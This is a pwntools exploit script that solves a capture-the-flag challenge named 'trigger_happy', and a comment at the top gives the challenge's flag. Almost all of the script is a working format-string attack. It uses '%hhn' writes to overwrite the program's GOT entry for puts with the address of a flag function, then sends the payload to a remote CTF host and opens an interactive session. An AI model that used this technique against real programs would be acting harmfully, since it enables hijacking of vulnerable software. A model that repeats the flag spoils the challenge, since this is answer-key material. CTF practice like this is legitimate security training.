#flag = 0xl4ugh{trigger_happy_pack_heat_but_its_pwn_skills}
from pwn import *

exe = ELF("./trigger_happy")
puts = exe.got['puts']
flag = exe.sym['flaggy']	#0x08049245

context.binary = exe

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("ctf.0xl4ugh.com", 1337)

def main():
	r = conn()
	payload  = ""
	payload += "%" + str(0x045 - 0x000) + "c" + "%19$hhn"
	payload += "%" + str(0x092 - 0x045) + "c" + "%20$hhn"
	payload += "%" + str(0x104 - 0x092) + "c" + "%21$hhn"
	payload += "%" + str(0x108 - 0x104) + "c" + "%22$hhn"
	payload  = payload.ljust(60, "\x00")
	payload += p32(puts + 0x00) + p32(puts + 0x01) + p32(puts + 0x02) + p32(puts + 0x03)
	r.sendline(payload)
	r.interactive()

if __name__ == "__main__":
    main()
